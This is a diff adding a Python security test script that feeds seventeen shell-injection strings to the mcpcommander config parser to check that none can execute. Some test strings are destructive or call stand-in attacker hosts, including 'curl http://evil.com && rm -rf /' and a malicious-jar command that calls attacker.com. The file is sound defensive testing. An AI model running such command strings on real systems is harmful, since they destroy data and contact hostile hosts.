@@ -1,0 +1,245 @@
+#!/usr/bin/env python3
+"""
+Security Testing Script for MCP Commander Command Parsing
+=========================================================
+
+This script attempts various code injection attacks against the command parsing
+logic in mcpcommander to ensure no code execution vulnerabilities exist.
+
+The parser should safely handle malicious input without allowing code execution.
+"""
+
+import json
+import sys
+from pathlib import Path
+
+# Add src to path for imports
+sys.path.insert(0, str(Path(__file__).parent / "src"))
+
+from mcpcommander.utils.config_parser import ServerConfigParser
+
+
+class SecurityTestRunner:
+    """Test runner for security injection attempts."""
+
+    def __init__(self):
+        self.test_results = []
+        self.total_tests = 0
+        self.passed_tests = 0
+
+    def run_test(self, test_name: str, malicious_command: str, expected_safe: bool = True):
+        """Run a single injection test."""
+        self.total_tests += 1
+        print(f"\n🔍 Testing: {test_name}")
+        print(f"Command: {malicious_command}")
+
+        try:
+            # Attempt to parse the malicious command
+            config = ServerConfigParser.parse_server_config(malicious_command)
+            result = config.dict()
+
+            print("✅ Parsed safely without execution:")
+            print(f"   Command: {result['command']}")
+            print(f"   Args: {result['args']}")
+
+            # Check if the result contains obvious injection attempts
+            full_command_parts = [result['command']] + result['args']
+            contains_injection = any(
+                suspicious in ' '.join(full_command_parts).lower()
+                for suspicious in ['echo', '$(', '`', ';', '&&', '||', '|', '>', '<']
+            )
+
+            if contains_injection and expected_safe:
+                print("⚠️  WARNING: Potential injection detected in parsed result!")
+                self.test_results.append({
+                    'test': test_name,
+                    'status': 'SUSPICIOUS',
+                    'command': malicious_command,
+                    'result': result
+                })
+            else:
+                print("✅ SAFE: No code execution occurred")
+                self.passed_tests += 1
+                self.test_results.append({
+                    'test': test_name,
+                    'status': 'SAFE',
+                    'command': malicious_command,
+                    'result': result
+                })
+
+        except Exception as e:
+            print(f"🛡️  SAFE: Parser rejected malicious input with error: {e}")
+            self.passed_tests += 1
+            self.test_results.append({
+                'test': test_name,
+                'status': 'REJECTED',
+                'command': malicious_command,
+                'error': str(e)
+            })
+
+    def run_all_tests(self):
+        """Run comprehensive injection attack tests."""
+        print("🔒 MCP Commander Security Injection Test Suite")
+        print("=" * 50)
+
+        # Test 1: Basic command injection via semicolon
+        self.run_test(
+            "Semicolon Command Injection",
+            "npx test-server; echo INJECTED"
+        )
+
+        # Test 2: Command substitution with backticks
+        self.run_test(
+            "Backtick Command Substitution",
+            "npx `echo malicious-server`"
+        )
+
+        # Test 3: Command substitution with $()
+        self.run_test(
+            "Dollar Command Substitution",
+            "npx $(echo malicious-server)"
+        )
+
+        # Test 4: Pipe to shell command
+        self.run_test(
+            "Pipe Command Injection",
+            "npx test-server | echo INJECTED"
+        )
+
+        # Test 5: Logical AND injection
+        self.run_test(
+            "Logical AND Injection",
+            "npx test-server && echo INJECTED"
+        )
+
+        # Test 6: Logical OR injection
+        self.run_test(
+            "Logical OR Injection",
+            "npx test-server || echo INJECTED"
+        )
+
+        # Test 7: Background process injection
+        self.run_test(
+            "Background Process Injection",
+            "npx test-server & echo INJECTED"
+        )
+
+        # Test 8: File redirection injection
+        self.run_test(
+            "File Redirection Injection",
+            "npx test-server > /tmp/injected.txt; echo INJECTED"
+        )
+
+        # Test 9: Environment variable injection
+        self.run_test(
+            "Environment Variable Injection",
+            "INJECTED=true npx test-server"
+        )
+
+        # Test 10: Complex path with injection attempt
+        self.run_test(
+            "Path with Injection Attempt",
+            "/Applications/Test.app/bin/java; echo INJECTED"
+        )
+
+        # Test 11: Quoted injection attempt
+        self.run_test(
+            "Quoted Injection Attempt",
+            '"npx test"; echo INJECTED'
+        )
+
+        # Test 12: Mixed quotes injection
+        self.run_test(
+            "Mixed Quotes Injection",
+            "npx 'test`echo INJECTED`server'"
+        )
+
+        # Test 13: Newline injection
+        self.run_test(
+            "Newline Injection",
+            "npx test-server\necho INJECTED"
+        )
+
+        # Test 14: Unicode/special characters
+        self.run_test(
+            "Unicode Special Characters",
+            "npx test-server\u0000echo INJECTED"
+        )
+
+        # Test 15: Long injection attempt
+        self.run_test(
+            "Long Injection Chain",
+            "npx test && echo INJECTED && curl http://evil.com && rm -rf /"
+        )
+
+        # Test 16: Realistic malicious Java command (similar to user's Burp Suite command)
+        self.run_test(
+            "Malicious Java Command",
+            '/Applications/Evil.app/Contents/Home/bin/java -jar /tmp/malicious.jar; echo INJECTED && curl http://attacker.com'
+        )
+
+        # Test 17: Windows-style injection
+        self.run_test(
+            "Windows Command Injection",
+            "npx test-server.exe & echo INJECTED & del C:\\important.txt"
+        )
+
+    def print_summary(self):
+        """Print test summary and results."""
+        print("\n" + "=" * 50)
+        print("🔒 SECURITY TEST RESULTS SUMMARY")
+        print("=" * 50)
+
+        print(f"Total Tests: {self.total_tests}")
+        print(f"Safe/Rejected: {self.passed_tests}")
+        print(f"Suspicious: {self.total_tests - self.passed_tests}")
+
+        if self.passed_tests == self.total_tests:
+            print("\n🎉 ALL TESTS PASSED! The parser appears secure against injection attacks.")
+        else:
+            print(f"\n⚠️  {self.total_tests - self.passed_tests} tests showed suspicious behavior!")
+
+        print("\nDetailed Results:")
+        print("-" * 30)
+
+        for result in self.test_results:
+            status_icon = {
+                'SAFE': '✅',
+                'REJECTED': '🛡️',
+                'SUSPICIOUS': '⚠️'
+            }.get(result['status'], '❓')
+
+            print(f"{status_icon} {result['test']}: {result['status']}")
+            if result['status'] == 'SUSPICIOUS':
+                print(f"   ⚠️  Command: {result['command']}")
+                print(f"   ⚠️  Result: {result['result']}")
+
+
+def main():
+    """Run the security test suite."""
+    print("Starting MCP Commander Security Injection Tests...")
+    print("This script will attempt various code injection attacks to verify parser security.")
+    print("No actual malicious code should execute.\n")
+
+    # Verify we can import the parser
+    try:
+        from mcpcommander.utils.config_parser import ServerConfigParser
+        print("✅ Successfully imported ServerConfigParser")
+    except ImportError as e:
+        print(f"❌ Failed to import parser: {e}")
+        sys.exit(1)
+
+    # Run the tests
+    runner = SecurityTestRunner()
+    runner.run_all_tests()
+    runner.print_summary()
+
+    # Save results to file
+    results_file = Path(__file__).parent / "security_test_results.json"
+    with open(results_file, 'w') as f:
+        json.dump(runner.test_results, f, indent=2)
+    print(f"\n📄 Detailed results saved to: {results_file}")
+
+
+if __name__ == "__main__":
+    main()
